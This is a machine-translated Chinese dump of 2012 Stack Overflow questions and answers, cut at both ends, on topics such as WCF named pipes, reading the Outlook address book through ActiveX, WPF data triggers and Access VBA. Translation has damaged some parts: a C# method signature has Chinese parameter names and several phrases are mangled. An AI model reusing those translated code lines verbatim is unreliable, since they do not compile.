就像薛定谔的猫同时**是和否**。

这取决于你真正在做什么！我曾经做过一个有和没有按位运算的数独求解器。这是我的基准：

*   有：0.9 毫
*   无：50 毫秒

我使用的是回溯算法，所以它解释了为什么它使用按位运算要快得多，因为数独是一个 NP-Complete（可能是 NP-Hard）问题。

但是，就像其他人已经告诉你的那样，它真的很难阅读和维护（我永远不会回到我的数独求解器中进行任何更改，在某些地方我不明白我做了什么）。

一般来说，按位运算总是比任何对应物都快***，***但除非您正在做的是关键软件的瓶颈，否则我不建议无缘无故地使用它。

# asp.net - 在 .net 3.5 根目录下运行 .net 4 站点时出错

> ID：11052367
> 
> 赞同：0
> 
> 时间：2012-06-15T14:13:43.720
> 
> 标签：asp.net, web-config

我有一个 .net 3.5 应用程序作为父应用程序，并在同一个文件夹中添加了一个运行 .net 4.0 应用程序的虚拟目录。错误消息来自子应用程序，如下所示

```
There is a duplicate 'system.web.extensions/scripting/scriptResourceHandler' section defined 
```

在父应用程序中，我添加了标签

```
<location inheritInChildApplications="false"> 
```

但没有任何改变。

有谁知道这怎么解决？

谢谢

# wcf - WCF 命名管道：流式处理（配置）问题

> ID：11052374
> 
> 赞同：3
> 
> 时间：2012-06-15T14:14:01.450
> 
> 标签：wcf, streaming, named-pipes, netnamedpipebinding

我正在构建一个 WCF 服务，以使用命名管道在两个进程之间传输大文件（~8 Gig）。

我已经有了以流模式传输小文件的概念。虽然对于较大的文件，我必须增加 maxReceivedMessageSize。我可以毫无问题地在主机 app.config 中指定 bindingConfiguration。

当我在客户端 app.config 的客户端端点中指定 bindingConfiguration 时，会出现问题。

```
bindingConfiguration="MyNamedPipeBinding" 
```

我得到的错误信息：

> 'net.pipe://localhost/MyService' 不支持正在使用的 .Net 框架模式。有关更多详细信息，请参阅服务器日志。
> 
> 不支持成帧模式 Singleton。

**主机配置：**

```
<services>
  <service name="MyService">
    <endpoint
      address="net.pipe://localhost/MyService"
      binding="netNamedPipeBinding"
      bindingConfiguration="MyNamedPipeBinding"
      contract="MyApp.MyService"
      name="MyServiceEndpoint"/>
  </service>
</services>
<bindings>
  <netNamedPipeBinding>
    <binding name="MyNamedPipeBinding" 
             transferMode="StreamedResponse" 
             maxBufferSize="32768" 
             maxReceivedMessageSize="21474836480">
      <security mode="None" />
    </binding>
  </netNamedPipeBinding>
</bindings> 
```

**客户端配置：**

```
<client>
  <endpoint
    address="net.pipe://localhost/MyService"
    binding="netNamedPipeBinding"
    bindingConfiguration="MyNamedPipeBinding"
    contract="MyApp.MyService"
    name="MyServiceEndpoint">
  </endpoint>
</client>
<bindings>
  <netNamedPipeBinding>
    <binding name="MyNamedPipeBinding" 
             transferMode="StreamedResponse" 
             maxBufferSize="32768" 
             maxReceivedMessageSize="21474836480">
      <security mode="None"  />
    </binding>
  </netNamedPipeBinding>
</bindings> 
```

# sql - SQL：当自定义函数包含“\”时，如何将参数传递给自定义函数

> ID：11052375
> 
> 赞同：-1
> 
> 时间：2012-06-15T14:14:01.567
> 
> 标签：sql

我有一个包含文本类型列的表，它被称为 user_name。其余的对于本次讨论并不重要。

我有一个名为 findme 的自定义函数，它需要一个文本参数

我在这张表中有 3 行：

user_name joe [未知] 域\用户名

所以查询是：

```
findme((''[unknown]'' = user_name)) returns one row
findme((''domain\\username'' = user_name)) does not return any rows 
```

第二个查询以及我将参数传递给函数的方式有什么不正确的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T14:22:42.130

就我而言，我只需要一个 . 我正在使用 Postgres 9.1

# c++ - 从c ++通过activex读取Outlook通讯簿随机返回未知错误

> ID：11052377
> 
> 赞同：2
> 
> 时间：2012-06-15T14:14:09.817
> 
> 标签：c++, vbscript, outlook, activex, exchange-server

我目前正在编写一个需要导入整个 Outlook 通讯录的程序。该程序是用 C++ 编写的（使用 gcc (MinGW) 编译），我使用 ActiveX 连接到 Outlook。

这就是我所做的：

1.  创建 Outlook.Application 的实例
2.  获取当前会话
3.  获取地址列表
4.  对于 AddressLists 中的每个 AddressList：获取 AddressEntries
5.  对于 AddressEntries 中的每个 AddressEntry：确定它是 ContactItem、ExchangeUser 还是其他
6.  如果是 ContactItem：请阅读以下属性：FirstName、LastName、MailingAddressStreet、MailingAddressPostOfficeBox、MailingAddressPostalCode、MailingAddressCity、CompanyName、Department、JobTitle、PrimaryTelephoneNumber、OtherTelephoneNumber、BusinessFaxNumber 和 Email1Address
7.  如果是 ExchangeUser：请阅读以下属性：FirstName、LastName、StreetAddress、PostalCode、City、CompanyName、Department、JobTitle、BusinessTelephoneNumber、MobileTelephoneNumber、Address
8.  如果它是另一种类型的 AddressEntry，请忽略它

只要地址簿中只有几个联系人，这就像一个魅力。但现在我在一家更大的公司中测试它，那里的地址簿中有大约 500 个联系人（ContactItems 和 ExchangeUsers），分为 22 个不同的地址列表。

在读取最大的 AddressList（包含 180 个 AddressEntries，所有 ExchangeUsers）期间，Outlook 的 ActiveX 组件突然返回一个未知错误（IDispatch->Invoke 的返回值为 0xFFFFFFFF）。它通常位于第 105 个和第 115 个 AddressEntry 之间，并且通常在读取 MobileTelephoneNumber 属性期间（但如果我将其注释掉，它只会在不同的呼叫中失败。

有什么想法我可能做错了吗？我的印象是这与大量的连续呼叫有关。也许每次通话后我都应该做一些清理工作？

无论如何，任何帮助将不胜感激！

问候， ldx

**编辑：**代码（为了简洁省略头文件）

### 1.应用类

```
Contact * MSOutlookContactSource::ToContact(SP<ContactUser> contactUser) const
{
  Contact * c = new Contact;
  c->setFirstName(contactUser->GetFirstName())
    .setLastName(contactUser->GetLastName())
    .setStreet(contactUser->GetMailingAddressStreet())
    .setStreetNr(contactUser->GetMailingAddressPostOfficeBox())
    .setZip(contactUser->GetMailingAddressPostalCode())
    .setCity(contactUser->GetMailingAddressCity())
    .setCompany(contactUser->GetCompanyName())
    .setDepartment(contactUser->GetDepartment())
    .setFunction(contactUser->GetJobTitle())
    .setTel1(contactUser->GetPrimaryTelephoneNumber())
    .setTel2(contactUser->GetOtherTelephoneNumber())
    .setFax(contactUser->GetBusinessFaxNumber())
    .setEmail(contactUser->GetEmail1Address());
  return c;
}
//----------------------------------------------------------------------
Contact * MSOutlookContactSource::ToContact(SP<ExchangeUser> exchangeUser) const
{
  Contact * c = new Contact;
  c->setFirstName(exchangeUser->GetFirstName())
    .setLastName(exchangeUser->GetLastName())
    .setStreet(exchangeUser->GetStreetAddress())
    .setZip(exchangeUser->GetPostalCode())
    .setCity(exchangeUser->GetCity())
    .setCompany(exchangeUser->GetCompanyName())
    .setDepartment(exchangeUser->GetDepartment())
    .setFunction(exchangeUser->GetJobTitle())
    .setTel1(exchangeUser->GetBusinessTelephoneNumber())
    .setTel2(exchangeUser->GetMobileTelephoneNumber())
    .setEmail(exchangeUser->GetAddress());
  return c;
}
//----------------------------------------------------------------------
vector<Contact *> MSOutlookContactSource::GetAllContacts() const
{
  LOG << "GetAllContacts" << endl;
  ActiveX::Initialize();
  vector<Contact *> retval;

  SP<Application> outlookApplication(Application::Create());
  SP<Namespace> session(outlookApplication->GetSession());
  SP<AddressLists> addressLists(session->GetAddressLists());
  long numAddressLists = addressLists->GetCount();
  LOG << "Found " << numAddressLists << " addressLists" << endl;
  for (long idxAddressLists = 1; idxAddressLists <= numAddressLists; ++idxAddressLists)
    {
      LOG << "Fetching addressList " << idxAddressLists << endl;
      SP<AddressList> addressList(addressLists->Item(idxAddressLists));
      SP<AddressEntries> addressEntries(addressList->GetAddressEntries());
      long numAddressEntries = addressEntries->GetCount();
      LOG << "Found " << numAddressEntries << " addressEntries" << endl;
      for (long idxAddressEntries = 1; idxAddressEntries <= numAddressEntries; ++idxAddressEntries)
        {
          LOG << "Fetching addressEntry " << idxAddressEntries << endl;
          SP<AddressEntry> addressEntry(addressEntries->Item(idxAddressEntries));
          SP<ContactUser> contactUser(addressEntry->GetContact());
          if (contactUser->IsNull())
            {
              SP<ExchangeUser> exchangeUser(addressEntry->GetExchangeUser());
              if (!exchangeUser->IsNull())
                {
                  LOG << "It's an ExchangeUser" << endl;
                  retval.push_back(ToContact(exchangeUser));
                }
              else
                LOG << "I don't know what it is => skipping" << endl;
            }
          else
            {
              LOG << "It's a ContactUser" << endl;
              retval.push_back(ToContact(contactUser));
            }
        }
    }

  ActiveX::Uninitialize();
  unsigned num_found = retval.size();
  LOG << "Found " << num_found << " contacts" << endl;
  return retval;
}
//---------------------------------------------------------------------- 
```

### 2\. 域对象（示例）。其他领域对象的实现方式类似

```
ExchangeUser::ExchangeUser() : 
  ActiveXProxy(NULL)
{
}
//----------------------------------------------------------------------
ExchangeUser::ExchangeUser(IDispatch * parent) : 
  ActiveXProxy(parent)
{
}
//----------------------------------------------------------------------
ExchangeUser::~ExchangeUser()
{
}
//----------------------------------------------------------------------
ExchangeUser::ExchangeUser(const ExchangeUser & to_copy) : 
  ActiveXProxy(to_copy)
{
}
//----------------------------------------------------------------------
ExchangeUser & ExchangeUser::operator=(const ExchangeUser & to_copy)
{
  if (&to_copy != this)
    {
      *((ActiveXProxy *)this) = to_copy;
    }

  return *this;
}
//----------------------------------------------------------------------
bool ExchangeUser::IsNull()
{
  return _parent == NULL;
}
//----------------------------------------------------------------------
string ExchangeUser::GetFirstName()
{
  wstring wstr(ActiveX::GetProperty(_parent, L"FirstName", 0).bstrVal);
  string str(wstr.size(), ' ');
  copy(wstr.begin(), wstr.end(), str.begin());
  return str;
}
//----------------------------------------------------------------------
string ExchangeUser::GetLastName()
{
  wstring wstr(ActiveX::GetProperty(_parent, L"LastName", 0).bstrVal);
  string str(wstr.size(), ' ');
  copy(wstr.begin(), wstr.end(), str.begin());
  return str;
}
//----------------------------------------------------------------------
string ExchangeUser::GetStreetAddress()
{
  wstring wstr(ActiveX::GetProperty(_parent, L"StreetAddress", 0).bstrVal);
  string str(wstr.size(), ' ');
  copy(wstr.begin(), wstr.end(), str.begin());
  return str;
}
//----------------------------------------------------------------------
string ExchangeUser::GetPostalCode()
{
  wstring wstr(ActiveX::GetProperty(_parent, L"PostalCode", 0).bstrVal);
  string str(wstr.size(), ' ');
  copy(wstr.begin(), wstr.end(), str.begin());
  return str;
}
//----------------------------------------------------------------------
string ExchangeUser::GetCity()
{
  wstring wstr(ActiveX::GetProperty(_parent, L"City", 0).bstrVal);
  string str(wstr.size(), ' ');
  copy(wstr.begin(), wstr.end(), str.begin());
  return str;
}
//----------------------------------------------------------------------
string ExchangeUser::GetCompanyName()
{
  wstring wstr(ActiveX::GetProperty(_parent, L"CompanyName", 0).bstrVal);
  string str(wstr.size(), ' ');
  copy(wstr.begin(), wstr.end(), str.begin());
  return str;
}
//----------------------------------------------------------------------
string ExchangeUser::GetDepartment()
{
  wstring wstr(ActiveX::GetProperty(_parent, L"Department", 0).bstrVal);
  string str(wstr.size(), ' ');
  copy(wstr.begin(), wstr.end(), str.begin());
  return str;
}
//----------------------------------------------------------------------
string ExchangeUser::GetJobTitle()
{
  wstring wstr(ActiveX::GetProperty(_parent, L"JobTitle", 0).bstrVal);
  string str(wstr.size(), ' ');
  copy(wstr.begin(), wstr.end(), str.begin());
  return str;
}
//----------------------------------------------------------------------
string ExchangeUser::GetBusinessTelephoneNumber()
{
  wstring wstr(ActiveX::GetProperty(_parent, L"BusinessTelephoneNumber", 0).bstrVal);
  string str(wstr.size(), ' ');
  copy(wstr.begin(), wstr.end(), str.begin());
  return str;
}
//----------------------------------------------------------------------
string ExchangeUser::GetMobileTelephoneNumber()
{
  wstring wstr(ActiveX::GetProperty(_parent, L"MobileTelephoneNumber", 0).bstrVal);
  string str(wstr.size(), ' ');
  copy(wstr.begin(), wstr.end(), str.begin());
  return str;
}
//----------------------------------------------------------------------
string ExchangeUser::GetAddress()
{
  wstring wstr(ActiveX::GetProperty(_parent, L"Address", 0).bstrVal);
  string str(wstr.size(), ' ');
  copy(wstr.begin(), wstr.end(), str.begin());
  return str;
}
//---------------------------------------------------------------------- 
```

### 3\. ActiveXProxy 基类（_parent 是一个 IDispatch *）

```
ActiveXProxy::ActiveXProxy() : 
  _parent(NULL)
{
}
//----------------------------------------------------------------------
ActiveXProxy::ActiveXProxy(IDispatch * parent) : 
  _parent(parent)
{
}
//----------------------------------------------------------------------
ActiveXProxy::~ActiveXProxy()
{
  if (_parent != NULL)
    {
      _parent->Release();
      _parent = NULL;
    }
}
//----------------------------------------------------------------------
ActiveXProxy::ActiveXProxy(const ActiveXProxy & to_copy) : 
  _parent(to_copy._parent)
{
}
//----------------------------------------------------------------------
ActiveXProxy & ActiveXProxy::operator=(const ActiveXProxy & to_copy)
{
  if (&to_copy != this)
    {
      _parent = to_copy._parent;
    }

  return *this;
}
//---------------------------------------------------------------------- 
```

### 4\. ActiveX 实用程序类

```
map<HRESULT, string> ActiveX::_errorTranslations;
unsigned ActiveX::_numInits = 0;
//----------------------------------------------------------------------
void ActiveX::Initialize()
{
  if (_numInits == 0)
    {
      CoInitialize(NULL);      

      _errorTranslations[DISP_E_BADPARAMCOUNT] = "DISP_E_BADPARAMCOUNT";
      _errorTranslations[DISP_E_BADVARTYPE] = "DISP_E_BADVARTYPE";
      _errorTranslations[DISP_E_EXCEPTION] = "DISP_E_EXCEPTION";
      _errorTranslations[DISP_E_MEMBERNOTFOUND] = "DISP_E_MEMBERNOTFOUND";
      _errorTranslations[DISP_E_NONAMEDARGS] = "DISP_E_NONAMEDARGS";
      _errorTranslations[DISP_E_OVERFLOW] = "DISP_E_OVERFLOW";
      _errorTranslations[DISP_E_PARAMNOTFOUND] = "DISP_E_PARAMNOTFOUND";
      _errorTranslations[DISP_E_TYPEMISMATCH] = "DISP_E_TYPEMISMATCH";
      _errorTranslations[DISP_E_UNKNOWNINTERFACE] = "DISP_E_UNKNOWNINTERFACE";
      _errorTranslations[DISP_E_UNKNOWNLCID ] = "DISP_E_UNKNOWNLCID ";
      _errorTranslations[DISP_E_PARAMNOTOPTIONAL] = "DISP_E_PARAMNOTOPTIONAL";
    }
  _numInits++;
}
//----------------------------------------------------------------------
void ActiveX::Uninitialize()
{
  if (_numInits > 0)
    {
      _numInits--;
      if (_numInits == 0)
        CoUninitialize();
    }
}
//----------------------------------------------------------------------
VARIANT ActiveX::GetProperty(IDispatch * from, LPOLESTR olePropertyName, int cArgs...)
{
  va_list marker;
  va_start(marker, cArgs);
  VARIANT *pArgs = new VARIANT[cArgs+1];

  char name[256];
  WideCharToMultiByte(CP_ACP, 0, olePropertyName, -1, name, 256, NULL, NULL);
  string propertyName(name);

  DISPID dispId;
  HRESULT hr = from->GetIDsOfNames(IID_NULL, &olePropertyName, 1, LOCALE_USER_DEFAULT, &dispId);
  if (SUCCEEDED(hr))
    {
      // Extract arguments...
      for(int i=0; i<cArgs; i++) 
        pArgs[i] = va_arg(marker, VARIANT);

      // Build DISPPARAMS
      DISPPARAMS dispParams = { NULL, NULL, 0, 0 };
      dispParams.cArgs = cArgs;
      dispParams.rgvarg = pArgs;

      EXCEPINFO excepInfo;
      VARIANT vProperty;
      hr = from->Invoke(dispId, IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &dispParams, &vProperty, &excepInfo, NULL);
      if (SUCCEEDED(hr))
        {
          va_end(marker);
          delete [] pArgs;
          return vProperty;
        }
      else
        {
          va_end(marker);
          delete [] pArgs;

          stringstream errorMessage;
          errorMessage << "Failed to Invoke property-get on " << propertyName << " (" << hr << " - " << TranslateError(hr);
          if (hr == DISP_E_EXCEPTION)
            errorMessage << " exception: " << excepInfo.wCode << " - " << excepInfo.bstrDescription;
          errorMessage << " )";
          throw ActiveXException(errorMessage.str());
        }
    }
  else
    {
      va_end(marker);
      delete [] pArgs;
      throw ActiveXException(string("Failed to get DISPID of property ") + propertyName);
    }
}
//----------------------------------------------------------------------
VARIANT ActiveX::CallMethod(IDispatch * on, LPOLESTR oleMethodName, int cArgs...)
{
  va_list marker;
  va_start(marker, cArgs);
  VARIANT *pArgs = new VARIANT[cArgs+1];

  char name[256];
  WideCharToMultiByte(CP_ACP, 0, oleMethodName, -1, name, 256, NULL, NULL);
  string methodName(name);

  DISPID dispId;
  HRESULT hr = on->GetIDsOfNames(IID_NULL, &oleMethodName, 1, LOCALE_USER_DEFAULT, &dispId);
  if (SUCCEEDED(hr))
    {
      // Extract arguments...
      for(int i=0; i<cArgs; i++) 
        pArgs[i] = va_arg(marker, VARIANT);

      // Build DISPPARAMS
      DISPPARAMS dp = { NULL, NULL, 0, 0 };
      dp.cArgs = cArgs;
      dp.rgvarg = pArgs;

      // Make the call!
      EXCEPINFO excepInfo;
      VARIANT result;
      hr = on->Invoke(dispId, IID_NULL, LOCALE_SYSTEM_DEFAULT, 
                      DISPATCH_METHOD, &dp, &result, &excepInfo, NULL);
      if(SUCCEEDED(hr))
        return result;
      else
        {
          va_end(marker);
          delete [] pArgs;

          stringstream errorMessage;
          errorMessage << "Failed to call method " << methodName << " (" << hr << " - " << TranslateError(hr);
          if (hr == DISP_E_EXCEPTION)
            errorMessage << " exception: " << excepInfo.wCode << " - " << excepInfo.bstrDescription;
          errorMessage << " )";
          throw ActiveXException(errorMessage.str());
        }
    }
  else
    {
      va_end(marker);
      delete [] pArgs;
      throw ActiveXException(string("Failed to get DISPID of method ") + methodName);
    }
}
//----------------------------------------------------------------------
string ActiveX::TranslateError(HRESULT error)
{
  return _errorTranslations[error];
}
//---------------------------------------------------------------------- 
```

ActiveX 是一个纯静态类

**编辑 2**：看起来这不是 C++ 相关的问题。我想确保释放资源不是问题。所以我在 VBS 中复制了我的代码（拍我）：

```
Set objFSO = CreateObject("Scripting.FileSystemObject")
If Not objFSO.FileExists("out.log") Then
   objFSO.CreateTextFile("out.log")
End If
Set objLog = objFSO.OpenTextFile("out.log", 2, True)

Set objOutlook = CreateObject("Outlook.Application")
Set objSession = objOutlook.Session
Set objAddressLists = objSession.AddressLists
objLog.WriteLine("--- Found " + CStr(objAddressLists.Count) + " AddressLists")

For i = 1 To objAddressLists.Count
    objLog.WriteLine("--- AddressList " + CStr(i))
    Set objAddressList = objAddressLists.Item(i)
    objLog.WriteLine("+++ AddressListName = " + objAddressList.Name)
    Set objAddressEntries = objAddressList.AddressEntries
    objLog.WriteLine("--- AddressList has " + CStr(objAddressEntries.Count) + " AddressEntries")

    For j = 1 To objAddressEntries.Count

      objLog.WriteLine("--- AddressEntry " + CStr(i) + "." + CStr(j))
      Set objAddressEntry = objAddressEntries.Item(j)    

      If objAddressEntry.AddressEntryUserType = olExchangeUserAddressEntry Then

        Set objExchangeUser = objAddressEntry.GetExchangeUser()
        objLog.WriteLine("Exchangeuser: " + _
                         objExchangeUser.FirstName + "|" + _
                         objExchangeUser.LastName + "|" + _
                         objExchangeUser.StreetAddress + "|" + _
                         objExchangeUser.PostalCode + "|" + _
                         objExchangeUser.City + "|" + _
                         objExchangeUser.CompanyName + "|" + _
                         objExchangeUser.Department + "|" + _
                         objExchangeUser.JobTitle + "|" + _
                         objExchangeUser.BusinessTelephoneNumber + "|" + _
                         objExchangeUser.MobileTelephoneNumber + "|" + _
                         objExchangeUser.Address)
        Set objExchangeUser = Nothing

      ElseIf objAddressEntry.AddressEntryUserType = olOutlookContactAddressEntry Then

        Set objContact = objAddressEntry.GetContact()
        objLog.WriteLine("Contactuser: " + _
                         objContact.FirstName + "|" + _
                         objContact.LastName + "|" + _
                         objContact.MailingAddressStreet + "|" + _
                         objContact.MailingAddressPostOfficeBox + "|" + _
                         objContact.MailingAddressPostalCode + "|" + _
                         objContact.MailingAddressCity + "|" + _
                         objContact.CompanyName + "|" + _
                         objContact.Department + "|" + _
                         objContact.JobTitle + "|" + _
                         objContact.PrimaryTelephoneNumber + "|" + _
                         objContact.OtherTelephoneNumber + "|" + _
                         objContact.BusinessFaxNumber + "|" + _
                         objContact.Email1Address)
        Set objContact = Nothing
      End If
      Set objAddressEntry = Nothing
    Next
    Set objAddressEntries = Nothing
    Set objAddressList = Nothing
Next

objTextFile.Close
MsgBox "Done" 
```

你猜怎么着：我也得到了错误！只有 VBS 似乎给了我一些额外的信息：有时我得到：

```
错误：服务器抛出异常
代码：80010105
来源：（空）

```

有时我会得到：

```
错误：远程过程调用失败
代码：800706BE
来源：（空）

```

另外：错误发生后，Outlook 完全崩溃：-|

帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T15:18:56.397

您需要屈服于调度程序，以便您的宏不会被终止。有几种方法可以解决它，但我发现结合[`DoEvents`](https://stackoverflow.com/questions/3735378/how-do-i-force-a-screen-update-in-excel-vba)似乎[`Sleep()`](https://stackoverflow.com/a/3891017/175679)可以解决这个问题。

这可能需要根据您的环境设置和性能需求进行一些调整。

### 屈服钩

```
For j = 1 To objAddressEntries.Count
    ' allow other events to trigger
    For intWait = 1 To 15000
        DoEvents
    Next  
    ' Yield to other events      
    If (j Mod 50 = 0) Then
        Sleep (5000)
    End If

    ' process address entry
    '...

Next 
```

### 睡眠依赖（*位于模块 subs 的顶部*）

```
Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T19:43:25.773

错误是 RPC_S_CALL_FAILED 和 RPC_E_SERVERFAULT。这表明您打开了太多对象并用尽了 RPC 通道（此限制由 Exchange 服务器强加）。使用完所有 Outlook 对象后立即释放它们，并避免使用多点表示法（这会创建您无法显式引用和释放的隐式变量）。

# reporting-services - Reporting Services - 禁用自动加载

> ID：11052379
> 
> 赞同：1
> 
> 时间：2012-06-15T14:14:15.917
> 
> 标签：reporting-services, business-intelligence

如何禁用报告自动加载？如果我有所有参数的默认值，就会发生这种情况。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T11:36:08.987

[我在Microsoft connect](http://connect.microsoft.com/SQLServer/feedback/details/491145/ssrs-report-viewer-control-prevent-auto-rendering)找到了解决方法。

第一，在设计师集合中`ShowReportBody= false`；

然后，在后面的代码中：

```
    protected void ReportViewer1_SubmittingParameterValues（对象发送者，Microsoft.Reporting.WebForms.ReportParametersEventArgs e）
        {
            this.ReportViewer1.ShowReportBody = true;
        }

```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T15:16:55.227

`ShowParameterPrompts="True"`在 ReportViewer 控件上设置。这应该禁用自动呈现报告。

# doctrine - 所有关键实体（及其简化）

> ID：11052383
> 
> 赞同：1
> 
> 时间：2012-06-15T14:14:29.413
> 
> 标签：doctrine, doctrine-orm, composite-primary-key

有没有办法（使用 Doctrine 2）让实体相互嵌入（甚至不需要为某些实体提供表格）？有一个类的最简单的例子是：

```
class Point {

    /** @Id @Column(type="integer") */
    private $x;

    /** @Id @Column(type="integer") */
    private $y;
} 
```

然后将其嵌入到另一个对象中，例如：

```
class Line {

    /**
     * @OneToOne(targetEntity="Point")
     * @JoinColumn(name="start_x", referencedColumnName="x")
     * @JoinColumn(name="start_y", referencedColumnName="y")
     **/
    private $start;

    /**
     * @Column(type="integer")
     **/
    private $length;
} 
```

要点：所有字段都`Point`包含在它的主键中，实际上它已嵌入`Line`其中，因此没有必要使用它的表。

我知道一种可能性，可以`array`用作类型并让 PHP 将点序列化为 varchar 字段，但这会消除我使用 ORM 而不是*键值的这一点，一切都是序列化的*存储方案。

# wpf - 数据触发器集模板

> ID：11052386
> 
> 赞同：0
> 
> 时间：2012-06-15T14:14:38.500
> 
> 标签：wpf, templates, styles, datatrigger

我必须 SetTemplate 并且我使用了 DataTrigger 但它不起作用。

我的代码：

```
<Style TargetType="{x:Type local:My_type}">
    <Style.Triggers>
        <DataTrigger Binding="{Binding GUID, RelativeSource={RelativeSource AncestorType={x:Type local:MyClassViewControl}}}" 
                     Value="id1">
                <Setter Property="Template" Value="{StaticResource FirstTemplate}" />
        </DataTrigger>
        <DataTrigger Binding="{Binding GUID, 
                RelativeSource={RelativeSource AncestorType={x:Type local:MyClassViewControl}}}" 
                     Value="id2">
            <Setter Property="Template" Value="{StaticResource SecondTemplate}" />
        </DataTrigger>
    </Style.Triggers>
</Style> 
```

[这](http://msdn.microsoft.com/fr-fr/library/ms743659.aspx)是一个例子。为什么我的代码不起作用？GUID 没有错（“id1”或“id2”）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:25:58.813

我认为这

```
"{Binding GUID, RelativeSource={RelativeSource 
      AncestorType={x:Type local:MyClassViewControl}}}" 
```

应该

```
"{Binding GUID, RelativeSource={RelativeSource FindAncestor, 
      AncestorType={x:Type local:MyClassViewControl}}}" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T09:03:45.417

我找到了解决方案：在 C# 中创建 TemplateSelector：

```
public class GUIDTemplateSelector : DataTemplateSelector
{
    public override DataTemplate SelectTemplate(object item, DependencyObject container)
    {
        FrameworkElement element = container as FrameworkElement;
        if (item != null && element != null)
        {
            string GUID = item as string;
            if (GUID != null)
            {
                if (GUID.Equals("id1"))
                {
                    return element.FindResource("FirstTemplate") as DataTemplate;
                }
                if (GUID.Equals("id2"))
                {
                    return element.FindResource("SecondTemplate") as DataTemplate;
                }
            }
        }
        return null;
    }
} 
```

在我的 XAML 文件中：

```
<local:GUIDTemplateSelector x:Key="TheGUIDControlTemplateSelector"/>

<Style TargetType="{x:Type My_type}">
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="{x:Type local:My_type}">
                <ContentControl ContentTemplateSelector="{StaticResource TheGUIDTemplateSelector}" Content="{Binding GUID,RelativeSource={RelativeSource AncestorType={x:Type local:My_type}}}"/>
            </ControlTemplate>
        </Setter.Value>
    </Setter>
</Style> 
```

# string - Network.Socket.ByteString.Lazy 的 sendTo 在哪里？

> ID：11052388
> 
> 赞同：1
> 
> 时间：2012-06-15T14:14:41.317
> 
> 标签：string, networking, haskell, bytestring

两者`Network.Socket.ByteString`都有`Network.Socket.ByteString.Lazy`一个`send`功能。

`Network.Socket.ByteString`有`sendTo`功能，但`Network.Socket.ByteString.Lazy`没有。

如何将`Network.Socket.ByteString`'s sendTo 与 Lazy.ByteString*或* `Network.Socket.ByteString.Lazy`'`send`函数一起使用。（即我如何告诉它将数据包发送到哪里。）

任何人都可以推荐一个关于 Haskell 字符串 BytesStrings 的好教程。Lazy.ByteStrings 等，因为我发现它们非常令人困惑（来自 Java/Python 背景）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:55:28.003

答案是创建一个新功能：

```
import Data.ByteString as BS
import Data.ByteString.Lazy as LBS

lazyToStrictBS :: LBS.ByteString -> BS.ByteString
lazyToStrictBS x = BS.concat $ LBS.toChunks x 
```

并使用它将 转换`Lazy.ByteString`为正常的`ByteString`.

这是相反的，所以当我将来再次搜索这个问题时我会找到它。

```
import Data.ByteString as BS
import Data.ByteString.Lazy as LBS

strictToLazyBS :: BS.ByteString -> LBS.ByteString
strictToLazyBS x = LBS.fromChunks [x] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-17T05:40:23.657

请注意， sendTo 在发送的数据中是严格的，因此将惰性字节串传递给它没有真正的逻辑。这就是为什么该函数只存在于严格的字节串上。

# forms - 如何有条件地停止访问 VBA 代码？

> ID：11052392
> 
> 赞同：2
> 
> 时间：2012-06-15T14:14:50.877
> 
> 标签：forms, ms-access, vba, procedure

所以我在 Access 中创建了一个表单，它有一个组合框和一个文本框。表单在按下按钮后会计算一些东西，但是组合框和文本框都必须填写，或者两者都不能填写。我想要做的是设置一个条件，如果只填充其中一个，则会弹出一个消息框，解释填充两个框，然后继续停止代码。我了解如何执行消息框部分，但现在它正在显示消息框，然后继续执行产生错误的代码。

我已经做了一些研究，但我发现的大部分内容都与暂时暂停表格有关，而不是完全停止它。

我有一些关于如何做到这一点的想法，但我在执行它们时遇到了麻烦，坦率地说，我什至不确定它们是否会起作用。我的第一个计划是复制并粘贴过程中的所有计算部分，用它们创建一个新过程，在按钮单击过程中创建一个 if 语句，如果它通过 if 语句，则调用新过程。我的第二个计划有点乏味，但我相当有信心它会奏效。它只是用 if 语句包围整个代码，如果通过则执行代码，如果不通过，则不执行任何操作并让它到达过程的末尾并自行结束。我对第二个的唯一问题是我事先有很多代码，如果可以的话，我宁愿不要浪费大量时间重新缩进行，但如果我不能，我会把它作为备份找到更好的方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:41:50.890

您有几个可用的选项：

1.  正如您所建议的，将当前绑定到按钮单击事件的代码移至新的子过程。在按钮单击事件中执行您的验证，如果一切通过，则调用子过程。如果没有，请显示您的消息框。
2.  假设您在按钮单击事件中有适当的错误处理，请引发错误而不是显示消息框。这会将控制流移动到过程中的错误处理程序。
3.  显示消息框后，使用 Exit Sub 或 Exit Function 停止代码执行。

选项 1 可能是最好的方法，因为它促进了更好的编码实践。如果您有很长的子例程，则可能表明您需要将子例程分解为更小的工作单元，这使得代码重用和调试更加容易。

在条件确实是错误的某些情况下，选项 2 是合适的。有人可能会争辩说，验证测试失败是一种错误情况。

就个人而言，在大多数情况下，我倾向于避免使用 Exit Sub 和 Exit Function（选项 3），因为我喜欢在子例程中有一个点，例程退出并将控制权传递回调用过程。例程中有多个退出点表明您需要重构代码\重新考虑您正在应用的逻辑。有时无济于事，但通常会造成更难以调试的情况。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:33:57.680

当您弹出消息框时，您应该能够使用 Exit Sub 或 Exit Function 取决于您的程序是什么。它应该停止代码的执行并退出程序。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-04-10T19:04:46.817

我知道已经很晚了，但我只是想补充一点，如果您想停止运行任何 VBA 代码，例如，您可以`End`在错误处理程序中使用。这样它就不会返回到调用的子/函数（如果有的话）。

希望能帮助到你。

# ruby-on-rails - Rails：使用 Font Awesome

> ID：11052398
> 
> 赞同：58
> 
